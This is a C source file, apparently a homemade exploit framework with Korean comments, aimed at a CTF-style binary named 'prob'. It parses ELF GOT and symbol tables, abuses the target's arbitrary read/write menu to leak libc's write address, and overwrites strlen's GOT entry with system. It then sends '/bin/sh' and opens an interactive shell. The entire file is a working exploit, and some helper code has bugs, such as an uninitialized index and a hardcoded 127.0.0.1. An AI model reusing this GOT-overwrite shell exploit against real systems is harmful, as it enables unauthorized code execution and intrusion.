#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <malloc.h>
#include <elf.h>
#include <sys/socket.h> 
#include <netinet/in.h>
#include <arpa/inet.h>

#define INPUT_LIMIT 0x10000
#define RECV_LIMIT 0x10000
#define REMOTE 1
#define LOCAL 0
#define MODE REMOTE

int fd[2][2]; // 프로세스 통신을 위한 fd[0] : 입력, fd[1] : 출력

typedef struct Section{
    Elf64_Half SectionCnt;
    Elf64_Half SectionStringIndex;
    char * SectionName;
    Elf64_Shdr * SectionHeader;
}Section;

typedef struct got{
    char * name;
    unsigned long long addr;
} GOT;

typedef struct sym{
    char * name;
    unsigned long long value;
}SYM;

typedef struct elfinfo{
    int fd;
    char * filename;
    Section section;
    GOT * got;
    SYM * sym;
}ELFInfo;

unsigned long long * p64(unsigned long long value){
    unsigned long long * tmp = malloc(sizeof(unsigned long long) + 1);
    *(tmp) = value;
    *(char *)(tmp + sizeof(unsigned long long)) = '\0';

    return tmp;
}

unsigned int * p32(unsigned int value){
    unsigned int * tmp = malloc(sizeof(unsigned int) + 1);
    *(tmp) = value;
    *(char *)(tmp + sizeof(unsigned int)) = '\0';

    return tmp;
}

void remote(char * ip, int port){
    int SocketNum = socket(PF_INET, SOCK_STREAM, 0);
    struct sockaddr_in    server_addr;
    
    if(SocketNum < 0){
        printf("Socket 오류");
        exit(0);
    }

    memset( &server_addr, 0, sizeof( server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr= inet_addr(ip);

    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) != 1) {
        printf("inte_pton");
        exit(0);
    }
    if( -1 == connect( SocketNum, (struct sockaddr*)&server_addr, sizeof( server_addr) ) )
    {
        printf( "접속 실패\n");
        exit( 1);
    }
    fd[1][0] = SocketNum;
    fd[0][1] = SocketNum;
    
    printf("Set Connnection with %s:%d", ip, port);
}

int process(char * path){
    pid_t pid;
    if(pipe(fd[0]) < 0){
        printf("pipe error");
        exit(0);
    } 
    if(pipe(fd[1]) < 0){
        printf("pipe error");
        exit(0);
    } 
    
    switch(pid = fork()){
    case -1:
        printf("fork error");
        return -1;
    case 0:
        close(fd[1][0]);
        close(fd[0][1]);

        close(1);
        close(0);
        
        dup2(fd[1][1], STDOUT_FILENO);
        dup2(fd[0][0], STDIN_FILENO);
        
        execl(path, path, NULL);
    }

    close(fd[1][1]);
    close(fd[0][0]);

    char buf[1000];
    printf("[*] Starting local process... pid is %d\n", pid);
    return 0;
}

int Recvuntil(char * str, int print){
    int i = 0, len = strlen(str), cnt = 0; // i : index, len : source length, cnt : total recv amount
    char * tmp = (char * ) calloc(1, len);

    while(1){
        read(fd[1][0], tmp + i, 1);

        cnt++;
        if(print == 1) write(1, tmp + i, 1);
        if(*(tmp + i) == *(str + i)) i++;
        else i = 0;
        if(i == len - 1){
            free(tmp);
            return cnt;
        };
    }
}

char * Recv(int cnt, int print){
    char * tmp;
    int len;

    tmp = (char * ) calloc(1, cnt + 1); // cnt + 1 : NULL 문자 때문에
    len = read(fd[1][0], tmp, cnt);
    if(print == 1) printf("%s\n", tmp);

    return tmp;
}

int Send(char * str){
    return write(fd[0][1], str, strlen(str));
}

int Send32(char * str){ // 0 값을 보내기 위한 함수. strlen("\x00") = 0이기 때문
    return write(fd[0][1], str, 4);
}

int Send64(char * str){
    return write(fd[0][1], str, 8);
}

int Sendline(char * str){
    int len;
    char * tmp = (char * ) calloc(1, strlen(str) + 2); // strlen(str) + 2 : '\n' 개행 문자 , NULL 때문에

    strcpy(tmp, str);
    strcat(tmp, "\n");
    len = Send(tmp);
    free(tmp);
    return len;
}

void interactive(){
    char * input = (char * ) malloc(INPUT_LIMIT); // 사용자의 입력 저장. 최대 크기 : INPUT_LIMIT 매크로 상수(기본 : 0x1000)

    printf("Switching to interactive mode\n");
    while(1){
        Recv(RECV_LIMIT, 1); // 입력받을 최대크기 : RECV_LIMIT 매크로 상수(기본 : 0x1000)
        write(1, "$", 1);
        *(input + read(0, input, INPUT_LIMIT)) = '\0';
        Send(input);
    }
}


Section findSectionHeader(int fd){
    Section section;
    Elf64_Off * SectionHeader = malloc(sizeof(Elf64_Off));
    Elf64_Half * SectionCnt = malloc(sizeof(Elf64_Half));
    Elf64_Half * SectionStringIndex = malloc(sizeof(Elf64_Half));
    Elf64_Shdr * SectionInformation;
    char * SectionName;
    
    //ELF 헤더
    lseek(fd, offsetof(Elf64_Ehdr, e_shnum), SEEK_SET);
    read(fd, SectionCnt, sizeof(Elf64_Half));
    section.SectionCnt = *SectionCnt;
    SectionInformation = malloc(*SectionCnt * sizeof(Elf64_Shdr));
    section.SectionHeader = SectionInformation;

    lseek(fd, offsetof(Elf64_Ehdr, e_shoff), SEEK_SET);
    read(fd, SectionHeader, sizeof(Elf64_Off));

    lseek(fd, offsetof(Elf64_Ehdr, e_shstrndx), SEEK_SET);
    read(fd, SectionStringIndex, sizeof(Elf64_Half));
    section.SectionStringIndex = *SectionStringIndex;

    //색션 정보 얻기
    lseek(fd, *SectionHeader, SEEK_SET);
    read(fd, SectionInformation, sizeof(Elf64_Shdr) * *SectionCnt);

    Elf64_Shdr * SectionString = SectionInformation + *SectionStringIndex;
    lseek(fd, SectionString -> sh_offset, SEEK_SET);
    SectionName = malloc(SectionString -> sh_size);
    read(fd, SectionName, SectionString -> sh_size);
    section.SectionName = SectionName;

    return section;
}

Elf64_Shdr * getSectionInfo(Section section, char * name){
    for(int i = 0; i < section.SectionCnt; i++){
        if(!strcmp(section.SectionName + ((section.SectionHeader + i) -> sh_name),name)) return section.SectionHeader + i;
    }
    
    return 0;
}

GOT * findGOTInfo(int fd, Section section){
    int i;

    Elf64_Shdr * PLTRelSection = getSectionInfo(section, ".rela.plt");
    if(PLTRelSection == 0) return 0;
    Elf64_Shdr * dynsymSection = getSectionInfo(section, ".dynsym");
    Elf64_Shdr * dynstrSection = getSectionInfo(section, ".dynstr");

    Elf64_Rela * PLTRel = malloc(PLTRelSection -> sh_size);
    Elf64_Sym * dynsym = malloc(dynsymSection -> sh_size);
    char * dynstr = malloc(dynstrSection -> sh_size);

    int SymOffset; // got 주소 얻는데 사용
    int NameOffset;

    int FunctionCnt = (PLTRelSection -> sh_size) / sizeof(Elf64_Rela);
    GOT * got = malloc(sizeof(GOT) * (FunctionCnt + 1)); //FunctionCnt + 1 NULL 구조체 추가

    lseek(fd, PLTRelSection -> sh_offset, SEEK_SET);
    read(fd, PLTRel, PLTRelSection -> sh_size);

    lseek(fd, dynsymSection -> sh_offset, SEEK_SET);
    read(fd, dynsym, dynsymSection -> sh_size);

    lseek(fd, dynstrSection -> sh_offset, SEEK_SET);
    read(fd, dynstr, dynstrSection -> sh_size);
    
    int idx = 0;
    for(i = 0; i < FunctionCnt; i++){
        if((PLTRel + i) -> r_offset != 0){
            (got + idx) -> addr = (PLTRel + i) -> r_offset;

            SymOffset = ELF64_R_SYM((PLTRel + i) -> r_info);
            NameOffset = (dynsym +  SymOffset) -> st_name;
            (got + idx) -> name = dynstr + NameOffset;
            idx++;
        }
    }
    
    (got + i) -> addr = 0;
    (got + i) -> name = 0;

    return got;
}

unsigned long long getGOT(GOT * got, char * target){
    if(__glibc_unlikely(got == 0)) return 0;
    for(int i = 0; (got + i) -> addr != 0 || (got + i) -> name != 0; i++){
        if(!(strcmp((got + i) -> name, target))) return (got + i) -> addr;
    }

    return 0;
}

SYM * findSYM(int fd, Section section){
    int i;
    Elf64_Shdr * dynsymSection = getSectionInfo(section, ".dynsym");
    Elf64_Shdr * dynstrSection = getSectionInfo(section, ".dynstr");
    Elf64_Sym * dynsym = malloc(dynsymSection -> sh_size);
    char * dynstr = malloc(dynstrSection -> sh_size);

    int SymbolCnt = (dynsymSection -> sh_size) / sizeof(Elf64_Sym);
    SYM * symbol = malloc(sizeof(SYM) * (SymbolCnt + 1)); //SymbolCnt + 1 : NULL 구조체 추가

    char * t;
    int NameOffset;

    lseek(fd, dynsymSection -> sh_offset, SEEK_SET);
    read(fd, dynsym, dynsymSection -> sh_size);

    lseek(fd, dynstrSection -> sh_offset, SEEK_SET);
    read(fd, dynstr, dynstrSection -> sh_size);

    int idx;
    for(i = 0; i < SymbolCnt; i++){
        if(((dynsym + i) -> st_value) != 0){
            (symbol + idx) -> value = (dynsym + i) -> st_value;

            NameOffset = (dynsym + i) -> st_name;
            (symbol + idx) -> name = dynstr + NameOffset;
            idx++;
        }
    }
    (symbol + i) -> value = 0;
    (symbol + i) -> name = 0;

    return symbol;
}

unsigned long long getSYM(SYM * sym, char * target){

    if(__glibc_unlikely(sym == 0)) return 0;
    for(int i = 0; (sym + i) -> value != 0 || (sym + i) -> name != 0; i++){
        if(!(strcmp((sym + i) -> name, target)))return (sym + i) -> value;
    }

    return 0;
}

ELFInfo ELF(char * path){
    int fd = open(path, O_RDONLY);
    ELFInfo elf;

    elf.fd = fd;
    elf.filename = path;
    elf.section = findSectionHeader(fd);
    elf.got = findGOTInfo(fd, elf.section);
    elf.sym = findSYM(fd, elf.section);

    return elf;
}

ELFInfo getLibcELF(ELFInfo elf){
    char * LibcPath = malloc(1024);
    char * command = malloc(1024);
    int fd = open(".result.txt", O_RDWR | O_CREAT | O_TRUNC, 0644);
    ELFInfo LibcELF;
    char tmp;
    int i;

    sprintf(command, "ldd %s >> .result.txt", elf.filename);
    if(system(command) == -1){
        printf("system() error");
        exit(0);
    }

    for(int i = 0; i < 2; i++){
        while(1){
            read(fd, &tmp, 1);
            if(tmp == '>') break;
        }
    }
    
    for(int i = 0; i< 2; i++){
        i = 0;
        while(1){
            read(fd, &tmp, 1);
            if(tmp == ' ') break;
            *(LibcPath + i) = tmp;
            i++;
        }
    }
    
    LibcELF = ELF(LibcPath);

    return LibcELF;
}

void hexdump(void * target, int size){
    unsigned long long * t1;
    unsigned long long mask;
    unsigned long long tmp;
    for(long unsigned int i = 0; i < size / 16 + 1; i++){
        mask = 0xff;
        t1 = (unsigned long long *)target + i;
        printf("%08lx ", i);
        for(int j = 0; j < 16; j++){
            if(j % 4 == 0)printf(" ");
            tmp = *t1 & mask;
            printf("%02llx ", tmp >> (8 * j));
            mask = mask << 8;
        }
        printf(" ");
        mask = 0xff;
        t1 = (unsigned long long *)target + i;
        for(int j = 0; j < 16; j++){
            if(j % 4 == 0)printf("|");
            tmp = *t1 & mask;
            printf("%c", (char) (tmp >> (8 * j)));
            mask = mask << 8;
        }
        printf("\n");
    }
}

void io32(int a, int print){
    char * tmp = (char * )p32(a);
    Recvuntil("> ", print);
    Send32(tmp);
    free(tmp);
}

void io64(unsigned long long a, int print){
    char * tmp = (char * ) p64(a);
    Recvuntil("> ", print);
    Send64(tmp);
    free(tmp);
}

void arb_write(unsigned long long addr, unsigned long long value, int print){
    
    //io32(0, print);
    Recvuntil(">", print);
    Send32((char *)p32(0));

    io64(addr, print);
    io64(value, print);
    io32(8, print);

    Recvuntil("OK\n", print);
}

unsigned long long * arb_read(unsigned long long addr, unsigned long long size, int print){
    unsigned long long * ret;

    io32(1, print);
    io64(addr, print);
    io64(size, print);

    Recv(1, print); // ' ' 때문에 1바이트를 먼저 받아준다.
    ret = (unsigned long long *)Recv(8, print);
    Recvuntil("OK\n", print);
    
    printf("\n");
    hexdump(ret, 16);
    printf("\n");

    return ret;
}

void dummy(char * s, int print){
    io32(2, print);
    Recvuntil("> ", print);
    Sendline(s);
    Recvuntil("OK\n", print);
}

int main(){
    setvbuf(stdout, NULL, _IONBF, 0); // printf 함수 사용시 버퍼링 때문에 잘 출력이 안되는 경우가 있었음.
    unsigned long long LibcAddr;   
    
    ELFInfo elf = ELF("./prob");
    ELFInfo libc = getLibcELF(elf);
    //ELFInfo libc = ELF("/lib/x86_64-linux-gnu/libc.so.6");
    unsigned long long * WriteAddr;
    
    if(MODE == REMOTE) remote("localhost", 9000);
    else if(MODE == LOCAL) process("./prob");
    else {
        printf("set mode LOCAL or REMOTE");
        exit(0);
    }

    dummy("a", 0); // 바이너리의 dummy함수는 strlen 함수를 사용합니다. 따라서 dummy함수를 한번이라도 실행한다면 strlen 함수의 got에 strlen 함수의 실제주소가 들어가게 된다.
    
    WriteAddr = arb_read(getGOT(elf.got, "write"), 8, 0);
    LibcAddr = *WriteAddr - getSYM(libc.sym, "write");
    printf("[*] Libc address = %p\n", (void *)LibcAddr);

    arb_write(getGOT(elf.got, "strlen"), LibcAddr + getSYM(libc.sym, "system"), 0);
    
    io32(2, 0);
    Recvuntil("> ", 0);
    Sendline("/bin/sh");
    
    interactive();
}
